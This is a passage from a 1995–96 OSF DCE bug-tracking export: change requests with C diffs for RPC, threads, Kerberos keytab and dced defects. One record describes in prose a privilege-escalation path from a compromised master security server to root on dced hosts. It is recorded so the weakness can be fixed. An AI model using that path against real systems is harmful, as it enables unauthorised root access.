 We haven't experienced these hangs in DCE1.0.3.  In DCE1.1 a call to
 rpc__cn_call_forward_cancel() was removed from rpc__cn_assoc_send_frag().  
 This appears to have broken a cancellation condition.  OSF will need to 
 address reworking the previous fix (OSFs' CR# 10458) without removing the 
 cancellation code.  Since we haven't experience the problems reported 
 in CR# 10458 the code will be restored to the DCE1.0.3 behavior.
 
 
 REPRODUCIBLE:
 
 Happens intermittently.
 
 
 TEST SOFTWARE DESCRIPTION:
 
 No specific tests.
 
 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
Related-file::Added 950724 by warnick:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./cnassoc.c,v 8.2
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./cnassoc.c,v 8.2
 warnick 1995/07/24 18:28:33 +8 -2
 Reason:  OSDqa12113 removal of rpc__cn_call_local_cancel() causes server hangs
 Fix for OSDqa12113.
 
     *** /tmp/ci.27048..cnassoc.c.27089.1	Mon Jul 24 14:28:37 1995
     --- /tmp/cnassoc.c.27089.2	Mon Jul 24 14:28:38 1995
     ***************
     *** 2200,2209 ****
     --- 2200,2214 ----
                    * Do NOT forward the cancel to the server just record
                    * that it was detected.
                    * Note: this is a copy of rpc__cn_call_local_cancel()
                    * with the call to rpc__cn_call_forward_cancel() removed.
                    */
     + #ifdef hitm
     +             rpc__cn_call_local_cancel (assoc->call_rep,
     +                                        &retry_op,
     +                                        st);
     + #else
                   if (RPC_CALL_IS_CLIENT (((rpc_call_rep_t *) assoc->call_rep)))
                   {
                       /*
                        * Record the cancel that was just detected.
                        */
     ***************
     *** 2221,2230 ****
     --- 2226,2236 ----
                   else
                   {
                       retry_op = false;
                       *st = rpc_s_call_cancelled;
                   }
     + #endif
       
                   RPC_DBG_PRINTF (rpc_e_dbg_cancel, RPC_C_CN_DBG_CANCEL,
                                   ("(rpc__cn_assoc_send_frag) call_rep->%x assoc->%x desc->%x cancel caught\n", 
                                    assoc->call_rep,
                                    assoc,
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:
 
 Added back the call to rpc__cn_call_local_cancel() in
 rpc__cn_assoc_send_frag() so that rpc__cn_call_forward_cancel() 
 will get called.
 
 REGRESSION TEST SCENARIO:
  
 IFEST tests and stress tests.



CR Number                     : 13049
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Problem in i18n evaluation routines
Interest List CC                [mailname]+
Reported Date                 : 8/22/95
Found in Baseline             : 1.1
Found Date                    : 8/22/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/22/95 public]

This problem is reported by Vicki Pritko in IBM Edicott.  Following is the
defect description of defect 2254 Vicki opened for the problem.


prefix        d
name          2254
reference
abstract      Problem in evaluation routines
duplicate

state         open
severity      2
age           0

compName      rpc_runtime                 answer
release       mvs_r3
envName
level

addDate       95/08/22 08:33:18           assignDate    95/08/22 08:33:18
lastUpdate    95/08/22 08:33:18           responseDate
endDate

ownerLogin    ssk                         originLogin   vickip
ownerName     Sat Kahlon                  originName    Vicki Pritko
ownerArea     G98                         originArea    G98

defectOrigin    OSF11

defectType
defectTrigger   P06_normal_mode
defectSource
defectImpact    04_usability
actvtyWhnFound  03_ICODE
phaseInjected

aparNumber
Level 3 Hours

CA Required?
CA Performed

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------

    95/08/22 08:33:19    open            vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 95/08/22 08:33:19, action: open>
The rpc_cs_eval_with_universal and rpc_cs_eval_without_universal
API's have a problem with their evaluation logic.  The API's
retrieve the client and server codesets and then start doing
comparisons.  They do a loop that looks like:

   for (i = 1; i <= method_p->server->count; i++)
   {
       if (model_found)
          break;
       if (method_p->client->codesets[0].c_set
           == method_p->server->codesets[i].c_set)
       {
          do stuff
       }
       if (method_p->server->codesets[0].c_set
           == method_p->client->codesets[i].c_set)
       {
          do stuff
       }
   }

This code is incorrect when the server's count is different than
the client's count.  When the server's count is greater, then we
will go too far in the client's code set list for the second
check...  Or when the client's count is bigger, we might miss
checking a few code sets for equality.  This is an OSF bug.


    <Note by cwang (Cathy Wang), 1996/01/22 16:14:55, action: note>
The fix for this defect should be combined with the fix for the
defect 17941 (OT 13165).  Two files have been modified: runtime/cs_s_eval.c
and cs_s_stub.c.  Following are the diff files:

cs_s_eval.c.diff:

454,480d453
<                       #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 13165) */
<                       for (i = 1; i < method_p->server->count; i++)
<                       {
<                          if (smir_true)
<                               break;
<
<                          if (method_p->client->codesets[0].c_set
<                               == method_p->server->codesets[i].c_set)
<                          {
<                               smir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<                       for (i = 1; i < method_p->client->count; i++)
<                       {
<                          if (cmir_true)
<                               break;
<
<                          if (method_p->server->codesets[0].c_set
<                               == method_p->client->codesets[i].c_set)
<                          {
<                               cmir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<
<                       #else
500d472
<                       #endif         /* CMVC 17912, 17941 */
775,801d746
<                       #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 13165 </                      for (i = 1; i < method_p->server->count; i++)
<                       {
<                          if (smir_true)
<                               break;
<
<                          if (method_p->client->codesets[0].c_set
<                               == method_p->server->codesets[i].c_set)
<                          {
<                               smir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<                       for (i = 1; i < method_p->client->count; i++)
<                       {
<                          if (cmir_true)
<                               break;
<
<                          if (method_p->server->codesets[0].c_set
<                               == method_p->client->codesets[i].c_set)
<                          {
<                               cmir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<
<                       #else
821d765
<                       #endif         /* CMVC 17912, 17941 */


cs_s_stub.c.diff:

2339,2365d2338
<                            #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 3165) */
<                            for (i = 1; i < server->count; i++)
<                            {
<                               if (smir_true)
<                                       break;
<
<                               if (client->codesets[0].c_set
<                                       == server->codesets[i].c_set)
<                               {
<                                       smir_true = 1;
<                                       model_found = 1;
<                               }
<                            }
<                            for (i = 1; i < client->count; i++)
<                            {
<                               if (cmir_true)
<                                       break;
<
<                               if (server->codesets[0].c_set
<                                       == client->codesets[i].c_set)
<                               {
<                                       cmir_true = 1;
<                                       model_found = 1;
<                               }
<                            }
<
<                            #else
2385d2357
<                            #endif         /* CMVC 17912, 17941 */



CR Number                     : 13048
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : nsid
Short Description             : nsid doesn't work on a big-endian machine
Reported Date                 : 8/21/95
Found in Baseline             : 1.1
Found Date                    : 8/21/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : nosupport/nsid/nsicom.idl
					     nosupport/nsid/server.c
Sensitivity                   : public

[8/21/95 public]

(I don't know if this belongs to the rpc component, but since nsid provides
NSI, I'm assigning it to rpc.)

nsid is broken on big-endian machines. Here is the fix.

In nsicom.idl, change:

typedef ISO_MULTI_LINGUAL UNICODE_CHAR_T;

to:

typedef unsigned short UNICODE_CHAR_T;

("unsigned short" is what wchar_t is typedef'ed from on Windows, and
matches Windows' side of UNICODE_CHAR_T.)

In server.c, remove the byte swapping code in
ascii_to_unicode/unicode_to_ascii(). (Look around "BigEndianMachine".)

Note: The endian-ness detection code is bogus. When the typedef matches on
both sides, there is no byte-swapping needed.



CR Number                     : 13046
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : keytab/hostdata
Short Description             : dced created files are always owned by dced ("root").
Reported Date                 : 8/21/95
Found in Baseline             : 1.1
Found Date                    : 8/21/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/21/95 public]

keytab and hostdata storage files created by dced are always owned by
"root". There is no way to specify the ownership. It should probably be a
part of variable attributes. Note: Currently, keytab and hostdata, i.e.,
dced_entry_t, have no variable attribute. Lack of this makes obsoleting
rgy_edit impossible.

[8/21/95 public]

Oops, I missed dced_c_binding_syntax_bypass. The last sentence in the above
comment is false.



CR Number                     : 13043
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : routing has no persistent state
Reported Date                 : 8/18/95
Found in Baseline             : 1.1
Found Date                    : 8/17/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : svcroute.c
Sensitivity                   : public

[8/18/95 public]

The serviceability routing does not have a persistent state.  If file
wrapping (generations) is enabled then *.log.1 file is always
truncated and written over upon a DCE restart (e.g. restarting dced).

Current implementation always opens the *.1 file for writing thus
removing any history which may be relavant.  This is a problem
specially if DCE crashed while the current file was *.1 and then
was restarted.  It is also confusing in other scenerios when the last
file written to was some generation other than first and last before the
restart.

For each severity, there needs to be a generations file which can
store the current file name or generation such that upon a restart,
"current" + 1 file will be opened for writing thus leaving the
previous history untouched.

[08/19/95 public]
I changed this to an enhancement.  As a work-around, put the process id
in the routing spec.

[8/21/95 public]

I think that the above workaround will leave a lot of files and will lead
to an inode table full error, if not cleaned up properly.

[08/22/95 public]
Well, perhaps many open files but hard not many open inodes, since we're
talking about persistant across server-going-down times.

[8/25/95 public]

I meant the case of "...:FILE.n.m:foo%ld.log" and not open inodes, but the
inode table on the file system.

The default routing shipped with dce1.1 makes log files keep growing. We
have had a lot of user complains about log files filling up a disk and
making a system unuseable. (For instance, dtsd logs messages everytime
servers are down.) So the use of generations seemed a good idea, but now we
have to revisit it because we are losing messages.



CR Number                     : 13042
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : detecting tampering
Reported Date                 : 8/17/95
Found in Baseline             : 1.1
Found Date                    : 8/17/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/17/95 public]

If someone breaks into the master security server (e.g., they have
root access on the host where the master secd is running) they can
become root on any machine running dced.  They can do this by changing
the victim machine principal's password, log in as that principal, create
a "passwd_override" hostdata object, and then log into the victim machine.

dced changes the machine principal key often.  Suppose if it got a
"wrong key version" message back, it then "shut down" the remote
interfaces to hostdata, keytab, etc?



CR Number                     : 13033
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : client
Short Description             : some files don't check malloc()
					     for failures.
Reported Date                 : 8/9/95
Found in Baseline             : 1.1
Found Date                    : 8/9/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/9/95 public]

Three files in src/security/client/rca don't deal with malloc() failures
well; priv.c, sec_lrgy.c, and sec_rgy_attr.c.

	priv.c, at lines 879, 886, 1489, 1496, 2077, 2084, 2683, and
2690, appears to detect malloc failures, but does not set the status
code to indicate a failure.
	sec_lrgy.c, at lines 721, 726, 731, 736, 741, 746, 751, 756,
763, 770, 909, 913, and 918, does not check for a NULL return from
malloc().
	sec_rgy_attr.c, at lines 461 and 625, does not check for a NULL
return from malloc().

	These line numbers are from the HP Warranty Patch code.

	I gave this a "B2" because there is no work-around, and these
bugs can cause an application to crash, but to my knowledge no one has
run into them yet.



CR Number                     : 13028
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : cma__ts_func does not initialize cma.
Reported Date                 : 8/7/95
Found in Baseline             : 1.1
Found Date                    : 8/7/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : AT386|HP800|RIOS|SVR4/cma_thread_io.h
Sensitivity                   : public

[8/7/95 public]

The cma__ts_func macro that wraps a number of IO functions does not
initialize threads. If any of those calls happen to be the first cma
calls in your program you're in trouble.


#define cma__ts_func(func,fd,arglist,type,post_process)	{ \
    cma_t_integer   __res__; \
    cma_t_boolean   __done__ = cma_c_false; \
    if ((fd < 0) || (fd >= cma__g_mx_file)) return (cma__set_errno (EBADF),
-1); \
    if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \
    cma__fd_reserve (fd); \
    if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \
    if (cma__issue_io_call(fd)) {\
	if ((!cma__g_file[fd]->set_non_blocking) && \
		(cma__g_file[fd]->non_blocking == cma_c_true)) \
	    cma__set_nonblocking(fd); \
...

A possible fix is to add cma__int_init() as the first statement in the
cma__ts_func macro.

[01/24/96]

Here are complete diffs:

> ./threads/AT386/cma_thread_io.h
> Comparing revision 1.1.5.1 with revision 1.1.5.2.
> *** 1.1.5.1     1995/10/02 18:14:48
> --- 1.1.5.2     1995/11/09 21:06:14
> ***************
> *** 468,473 ****
> --- 468,474 ----
>       cma_t_integer   __res__; \
>       cma_t_boolean   __done__ = cma_c_false; \
>       if ((fd < 0) || (fd >= cma__g_mx_file)) return (cma__set_errno (EBADF), -1); \
> +     cma__int_init(); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \
>       cma__fd_reserve (fd); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \

> ./threads/HP800/cma_thread_io.h
> Comparing revision 1.1.3.1 with revision 1.1.4.1.
> *** 1.1.3.1     1995/10/02 18:14:57
> --- 1.1.4.1     1995/11/09 21:06:52
> ***************
> *** 443,448 ****
> --- 444,450 ----
>       cma_t_integer   __res__; \
>       cma_t_boolean   __done__ = cma_c_false; \
>       if ((fd < 0) || (fd >= cma__g_mx_file)) return (cma__set_errno (EBADF), -1); \
> +     cma__int_init(); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \
>       cma__fd_reserve (fd); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \

> ./threads/RIOS/cma_thread_io.h
> Comparing revision 1.1.3.1 with revision 1.1.4.1.
> *** 1.1.3.1     1995/09/28 17:02:26
> --- 1.1.4.1     1995/11/09 21:06:54
> ***************
> *** 441,446 ****
> --- 442,448 ----
>       cma_t_integer   __res__; \
>       cma_t_boolean   __done__ = cma_c_false; \
>       if ((fd < 0) || (fd >= cma__g_mx_file)) return (cma__set_errno (EBADF), -1); \
> +     cma__int_init(); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \
>       cma__fd_reserve (fd); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1); \

> ./threads/SVR4/cma_thread_io.h
> Comparing revision 1.1.3.1 with revision 1.1.4.1.
> *** 1.1.3.1     1995/10/02 18:15:06
> --- 1.1.4.1     1995/11/09 21:06:55
> ***************
> *** 392,397 ****
> --- 393,399 ----
>       cma_t_boolean   __done__ = cma_c_false;                                  \
>       if ((fd < 0) || (fd >= cma__g_mx_file))                                  \
>                 return (cma__set_errno (EBADF), -1);                           \
> +     cma__int_init(); \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1);       \
>       cma__fd_reserve (fd);                                                    \
>       if (!cma__is_open(fd)) return (cma__set_errno (EBADF), -1);       \



CR Number                     : 13019
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Coding error in krb5_ktfileint_internal_read_entry()
Reported Date                 : 8/4/95
Found in Baseline             : 1.1
Found Date                    : 3/24/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/krb5/lib/keytab/file/ktf_util.c
Sensitivity                   : public

[8/4/95 public]

1) In krb5_ktfileint_internal_read_entry(),
ret_entry->principal is allocated twice, when KRB5_BETA1 is defined.
The first allocation should be removed.

2) There are many missing free()s, when it returns with error, too.
All of the return after the allocation of ret_entry->principal, should be
changed to "goto fail".

=============================================================
src/security/krb5/lib/keytab/file/ktf_util.c
=============================================================
***************
*** 308,313 ****
--- 308,316 ----
      if (!(ret_entry = (krb5_keytab_entry *)calloc(1, sizeof(*ret_entry))))
        return ENOMEM;

+     /* This is to free the pointer in case of error */
+     *entrypp = ret_entry;
+
      /* fseek to synchronise buffered I/O on the key table. */

      if (fseek(KTFILEP(id), 0L, SEEK_CUR) < 0)
***************
*** 348,356 ****
--- 351,363 ----
      }
      if (!count || (count < 0))
        return KRB5_KT_END;
+ #if !defined (AIX_PROD) && !defined (IBMOS2)
+ #ifndef KRB5_BETA1
      ret_entry->principal = (krb5_principal)malloc(sizeof(krb5_principal_data))
;
      if (!ret_entry->principal)
          return ENOMEM;
+ #endif
+ #endif

  #ifdef KRB5_BETA1
      count++;
***************
*** 357,378 ****
      if (!(ret_entry->principal = (krb5_data **)calloc(count+1, sizeof(krb5_dat
a *))))
        return ENOMEM;
      for (i = 0; i < count; i++) {
!       if (!xfread(&princ_size, sizeof(princ_size), 1, KTFILEP(id)))
!           return KRB5_KT_END;
        if (KTVERSION(id) != KRB5_KT_VNO_1)
            princ_size = ntohs(princ_size);
!       if (!princ_size || (princ_size < 0))
!           return KRB5_KT_END;

!       if (!(ret_entry->principal[i] = (krb5_data *)malloc(sizeof(krb5_data))))
!           return ENOMEM;
        ret_entry->principal[i]->length = princ_size;
        ret_entry->principal[i]->data = malloc(princ_size);
!       if (!ret_entry->principal[i]->data)
!           return ENOMEM;
!       if (!xfread(ret_entry->principal[i]->data, sizeof(char), princ_size,
!                   KTFILEP(id)))
!           return KRB5_KT_END;
      }
     /* read in the principal type and throw it away, if we can get it */
      if (KTVERSION(id) != KRB5_KT_VNO_1) {
--- 364,396 ----
      if (!(ret_entry->principal = (krb5_data **)calloc(count+1, sizeof(krb5_dat
a *))))
        return ENOMEM;
      for (i = 0; i < count; i++) {
!         if (!xfread(&princ_size, sizeof(princ_size), 1, KTFILEP(id))) {
!             error = KRB5_KT_END;
!             goto fail;
!         }
        if (KTVERSION(id) != KRB5_KT_VNO_1)
            princ_size = ntohs(princ_size);
!         if (!princ_size || (princ_size < 0)) {
!             error = KRB5_KT_END;
!             goto fail;
!         }

!         if (!(ret_entry->principal[i] = (krb5_data *)malloc(sizeof(krb5_data))
))
!         {
!             error = ENOMEM;
!             goto fail;
!         }
        ret_entry->principal[i]->length = princ_size;
        ret_entry->principal[i]->data = malloc(princ_size);
!         if (!ret_entry->principal[i]->data) {
!             error = ENOMEM;
!             goto fail;
!         }
!         if (!xfread(ret_entry->principal[i]->data, sizeof(char), princ_size,
!                     KTFILEP(id))) {
!             error = KRB5_KT_END;
!             goto fail;
!         }
      }
      /* read in the principal type and throw it away, if we can get it */
      if (KTVERSION(id) != KRB5_KT_VNO_1) {

[10/6/95 public]

Submitted to 1.1 maint code base.

[12/29/95 public]
NOTE: (1) above has already been fixed in 1.2.1.
(2) from above should not be done unless you also make sure that it zeroes
out the length first, right after allocating it (because the fail: section
uses that in the loop condition).



CR Number                     : 13018
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : Acceptor credentials time-out
Reported Date                 : 8/4/95
Found in Baseline             : 1.1
Found Date                    : 8/4/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/4/95 public]
There is a bug in gss_accept_sec_context's handling of login-contexts.  When 
a server application calls gss_accept_sec_context and requests the client's
name, GSSAPI has to translate the client's UUID (obtained from the PAC) by
making an RPC to the registry, which requires a login-context.  If the
credential being used to accept the context is not capable of initiating
security contexts (i.e it's a GSS_C_ACCEPT credential), it doesn't contain
a login-context, so gss_accept_sec_context has to create one from the
credential's keytable entry.  This login-context is cached in the credential
for subsequent use.

Once the cached login-context expires, gss_accept_sec_context is supposed to
refresh it if it needs to translate another name.  The code is there to do
this refresh, but it never gets executed.

There are several workarounds, until I can get a fix for this:

i)  Don't ask for the client's name.  If the server is using DCE ACLs it
    doesn't need the client's name to do access control.  If the client's
    name is subsequently needed (e.g. for auditing), the application can
    do the translation itself, using its own login-context management.

ii) Use a fresh credential for each gss_accept_sec_context.  A fresh credential
    won't have a cached login-context, so gss_accept_sec_context will always
    create a new one.

iii) Use the Kerberos mechanism.  This mechanism transfers the client's name
     within the authentication token, so no registry translation is needed.
     Of course, the server doesn't get the client's PAC this way.

[8/4/95 public]

(i) is the solution we chose for the DCE sec_cred API.  Calls
to sec_cred_get_client_princ_name() return a sec_s_authz_cannot_comply
sttaus when the authorization service in use is authz_dce.



CR Number                     : 13015
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : more mem leaks in security APIs
Reported Date                 : 8/3/95
Found in Baseline             : 1.1wp
Found Date                    : 8/3/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
src/security/client/acl/daclbind.c
src/rpc/runtime/nsentry.c
src/admin/dced/server/init.c
Sensitivity                   : public

[8/3/95 public]
There are memory leaks in the DCED Database init routines and also in the
acl client binding code.

The point of this defect is to change rpc_ns_entry_inq_resolution to allocate
them as RPC_C_MEM_STRING so they can be freed with rpc_string_free().

=============================================================
src/security/client/acl/daclbind.c
=============================================================
***************
*** 450,456 ****
                    (char *)unresolved_name));
                strcpy((char *)tmp_unresolved_name, (char *)(unresolved_name +
                    1));
!               free(unresolved_name);
                  unresolved_name = tmp_unresolved_name;
            }
          /* component_name = unresolved_name + optional residual */
--- 450,456 ----
                    (char *)unresolved_name));
                strcpy((char *)tmp_unresolved_name, (char *)(unresolved_name +
                    1));
!               rpc_string_free(&unresolved_name, &st);
                  unresolved_name = tmp_unresolved_name;
            }
          /* component_name = unresolved_name + optional residual */
***************
*** 492,498 ****
        free((char *)residual);
      /* If we had an unresolved name and it's not the component name, free it *
/
      if ((unresolved_name != NULL) && (unresolved_name != component_name))
!       free((char *)unresolved_name);

      SEC_DBG_PRINTF(1,("sec_acl_bind: resolved name is '%s'\n",resolved_name));
      /* Get the uuid for the object
--- 492,501 ----
        free((char *)residual);
      /* If we had an unresolved name and it's not the component name, free it *
/
      if ((unresolved_name != NULL) && (unresolved_name != component_name))
!     {
!       rpc_string_free(&unresolved_name, &st);
!       unresolved_name = NULL;
!     }

      SEC_DBG_PRINTF(1,("sec_acl_bind: resolved name is '%s'\n",resolved_name));
      /* Get the uuid for the object
***************
*** 863,869 ****
                          IMPORT_HANDLE_VALID(context) = false;
                      }
                      if (HANDLE_STR(context) != (unsigned_char_p_t)NULL) {
!                         free((char *) HANDLE_STR(context));
                          HANDLE_STR(context) = (unsigned_char_p_t)NULL;
                      }
                      rebound = true;
--- 866,872 ----
                          IMPORT_HANDLE_VALID(context) = false;
                      }
                      if (HANDLE_STR(context) != (unsigned_char_p_t)NULL) {
!                         rpc_string_free(&(HANDLE_STR(context)), stp);
                          HANDLE_STR(context) = (unsigned_char_p_t)NULL;
                      }
                      rebound = true;
***************
*** 1034,1040 ****
                                      SET_STATUS(&lst, sec_acl_object_not_found)
;
                                      SEC_DBG_PRINTF(1,
                                      ("sec__acl_check_binding: skip over identi
cal binding\n"));
!                                     free((char *)hstr);
                                }
                            }
                          }
--- 1037,1043 ----
                                      SET_STATUS(&lst, sec_acl_object_not_found)
;
                                      SEC_DBG_PRINTF(1,
                                      ("sec__acl_check_binding: skip over identi
cal binding\n"));
!                                     rpc_string_free(&hstr, &lst);
                                }
                            }
                          }
***************
*** 1055,1061 ****
                      HANDLE_VALID(context) = true;   /* Rebound successfully */
                      HANDLE(context) = handle;
                      if (HANDLE_STR(context) != (unsigned_char_p_t)NULL)
!                         free((char *) HANDLE_STR(context));
                      HANDLE_STR(context) = hstr;
                      return true;
                  } else {
--- 1058,1064 ----
                      HANDLE_VALID(context) = true;   /* Rebound successfully */
                      HANDLE(context) = handle;
                      if (HANDLE_STR(context) != (unsigned_char_p_t)NULL)
!                         rpc_string_free(&(HANDLE_STR(context)), st_p);
                      HANDLE_STR(context) = hstr;
                      return true;
                  } else {



=============================================================
src/rpc/runtime/nsentry.c
=============================================================
***************
*** 718,724 ****
                  *resolved_name,
                  unsigned_char_p_t,
                  partial_results_length+1,
!                 RPC_C_MEM_NSRESOLUTION,
                  RPC_C_MEM_WAITOK);

              strcpy ((char *) *resolved_name, (char *)partial_results);
--- 718,724 ----
                  *resolved_name,
                  unsigned_char_p_t,
                  partial_results_length+1,
!                 RPC_C_MEM_STRING,
                  RPC_C_MEM_WAITOK);

              strcpy ((char *) *resolved_name, (char *)partial_results);
***************
*** 751,757 ****
                  *unresolved_name,
                  unsigned_char_p_t,
                  residual_length+1,
!                 RPC_C_MEM_NSRESIDUAL,
                  RPC_C_MEM_WAITOK);

              strcpy ((char *) *unresolved_name,
--- 751,757 ----
                  *unresolved_name,
                  unsigned_char_p_t,
                  residual_length+1,
!                 RPC_C_MEM_STRING,
                  RPC_C_MEM_WAITOK);

              strcpy ((char *) *unresolved_name,


=============================================================
src/admin/dced/server/init.c
=============================================================
***************
*** 229,235 ****
        unsigned_char_t *ucp;
        uuid_to_string(cf_pp_list[i], &ucp, st);
        sprintf(buf, "%s %s/bin/%s", ucp, dcelocal_path, DCECF_POSTPROC);
!       free(ucp);
        sa->strings[sa->num_strings] = (idl_char *)dce_strdup(buf);
        sa->num_strings++;
      }
--- 229,235 ----
        unsigned_char_t *ucp;
        uuid_to_string(cf_pp_list[i], &ucp, st);
        sprintf(buf, "%s %s/bin/%s", ucp, dcelocal_path, DCECF_POSTPROC);
!       rpc_string_free(&ucp, st);
        sa->strings[sa->num_strings] = (idl_char *)dce_strdup(buf);
        sa->num_strings++;
      }

[10/2/95 public]
Fixed in 1.1maint code



CR Number                     : 13014
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : sigaction fails with SIGTTIN & SIGTTOU
Reported Date                 : 8/3/95
Found in Baseline             : 1.1
Found Date                    : 8/3/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : cma_signal.c
Sensitivity                   : public

[8/3/95 public]

sigaction() fails with SIGTTIN & SIGTTOU (synchronous signals generated
when a background process attempts to read or write from its control
terminal). In cma__init_signal (cma_signal.c) those signals are incorrectly
added to cma___g_sigact_block_mask, the signal set for disallowed signals
for sigaction. Here is the suggested (but untested) fix:

*** /project/dce/build/dce1.1/src/threads/HP800/cma_signal.c    Thu Jun  9
09:34:39 1994
--- cma_signal.c        Thu Aug  3 12:35:30 1995
***************
*** 859,864 ****
--- 859,868 ----
        cma__bugcheck ("init_signal:17");
      if (sigaddset (&cma___g_sig_wait_mask, SIGPIPE) == -1)
        cma__bugcheck ("init_signal:18");
+     if (sigaddset (&cma___g_sig_wait_mask, SIGTTIN) == -1)
+       cma__bugcheck ("init_signal:35");
+     if (sigaddset (&cma___g_sig_wait_mask, SIGTTOU) == -1)
+       cma__bugcheck ("init_signal:36");
      if (sigaddset (&cma___g_sig_wait_mask, _SIGRESERVE) == -1)
        cma__bugcheck ("init_signal:21");
  
***************
*** 895,904 ****
        cma__bugcheck ("init_signal:33");
      if (sigaddset (&cma___g_sigact_block_mask, SIGCHLD) == -1)
        cma__bugcheck ("init_signal:34");
-     if (sigaddset (&cma___g_sigact_block_mask, SIGTTIN) == -1)
-       cma__bugcheck ("init_signal:35");
-     if (sigaddset (&cma___g_sigact_block_mask, SIGTTOU) == -1)
-       cma__bugcheck ("init_signal:36");
      if (sigaddset (&cma___g_sigact_block_mask, SIGIO) == -1)
        cma__bugcheck ("init_signal:37");
      if (sigaddset (&cma___g_sigact_block_mask, SIGVTALRM) == -1) 
--- 899,904 ----



CR Number                     : 13011
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : RCA
